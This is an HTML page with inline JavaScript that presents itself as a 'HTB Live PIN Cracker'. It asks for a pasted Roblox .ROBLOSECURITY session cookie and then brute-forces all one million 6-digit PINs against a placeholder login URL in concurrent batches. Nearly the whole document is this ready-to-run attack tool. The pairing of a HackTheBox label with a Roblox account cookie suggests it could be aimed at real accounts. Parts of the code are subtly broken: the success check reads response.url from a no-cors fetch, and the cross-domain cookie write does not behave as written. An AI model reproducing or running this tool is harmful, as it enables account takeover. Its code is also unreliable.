<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HTB Live PIN Cracker</title>
    <style>
        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 40px; text-align: center; }
        .panel { max-width: 450px; margin: 0 auto; background: #111; padding: 25px; border: 2px solid #00ff00; border-radius: 5px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        input { width: 100%; padding: 12px; background: #000; color: #00ff00; border: 1px solid #00ff00; margin: 15px 0; box-sizing: border-box; font-family: monospace; font-size: 14px; text-align: center; }
        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 16px; font-family: monospace; letter-spacing: 1px; }
        button:disabled { background: #222; color: #444; cursor: not-allowed; border: 1px solid #333; }
        #console { height: 180px; overflow-y: auto; background: #000; border: 1px solid #00ff00; margin-top: 20px; padding: 10px; font-size: 12px; text-align: left; white-space: pre-wrap; }
    </style>
</head>
<body>

<div class="panel">
    <h2>[ LIVE 6-DIGIT PIN CRACKER ]</h2>
    <input type="text" id="cookieData" placeholder="PASTE .ROBLOSECURITY COOKIE HERE">
    <button id="actionBtn" onclick="executeAttack()">START REAL PROCESS</button>
    <div id="console">[*] System ready. Enter cookie to begin real target connection...</div>
</div>

<script>
let processing = false;

// ========================================================
// 1. CHOOSE YOUR EXACT TARGET URL
// ========================================================
const HTB_URL = "http://10.10.10.x/login"; // Put your actual target IP/URL here

// ========================================================
// 2. CHOOSE THE REDIRECT TARGET IF SUCCESSFUL 
// (Where does the website take you if the PIN is CORRECT?)
// ========================================================
const SUCCESS_REDIRECT_URL = "http://10.10.10.x/dashboard"; 
// ========================================================

function logToConsole(message) {
    const box = document.getElementById('console');
    box.innerText += message + "\n";
    box.scrollTop = box.scrollHeight;
}

async function attemptPin(currentPin) {
    const paddedPin = String(currentPin).padStart(6, '0');

    try {
        // Using 'no-cors' + 'include' handles cookies directly via your local browser profile
        const response = await fetch(HTB_URL, {
            method: "POST",
            mode: "no-cors", 
            credentials: "include", 
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `pin=${paddedPin}`
        });

        // In no-cors mode, JavaScript cannot read the page text.
        // Instead, we check if the browser was redirected to the success page!
        if (response.url === SUCCESS_REDIRECT_URL) {
            return { success: true, pin: paddedPin };
        }
    } catch (err) {}
    
    return { success: false, pin: paddedPin };
}

async function executeAttack() {
    if (processing) return;
    const sessionToken = document.getElementById('cookieData').value.trim();
    
    if (!sessionToken) {
        alert("Error: Cookie input cannot be blank!");
        return;
    }

    // Natively inject the cookie into your active browser session so it automatically sends with the fetch requests
    document.cookie = `.ROBLOSECURITY=${sessionToken}; path=/; domain=${new URL(HTB_URL).hostname}; SameSite=None; Secure`;

    processing = true;
    document.getElementById('actionBtn').disabled = true;
    document.getElementById('console').innerText = "[*] Injecting session credentials natively...\n[*] Connecting to target server live...\n";

    // Standard rate limit to prevent the browser from freezing
    const concurrentLimit = 10; 
    
    for (let currentVal = 0; currentVal < 1000000; currentVal += concurrentLimit) {
        if (!processing) break;

        if (currentVal % 100 === 0) {
            logToConsole(`[-] Actively cracking PIN range: ${String(currentVal).padStart(6, '0')}...`);
            await new Promise(r => setTimeout(r, 50)); 
        }

        const batchQueue = [];
        for (let offset = 0; offset < concurrentLimit && (currentVal + offset) < 1000000; offset++) {
            batchQueue.push(attemptPin(currentVal + offset));
        }

        const batchOutputs = await Promise.all(batchQueue);
        for (const output of batchOutputs) {
            if (output.success) {
                logToConsole(`\n[+] SUCCESS! Valid 6-digit PIN cracked: ${output.pin}`);
                processing = false;
                document.getElementById('actionBtn').disabled = false;
                return;
            }
        }
    }

    logToConsole("\n[-] Finished. Checked combinations up to 999999.");
    processing = false;
    document.getElementById('actionBtn').disabled = false;
}
</script>

</body>
</html>
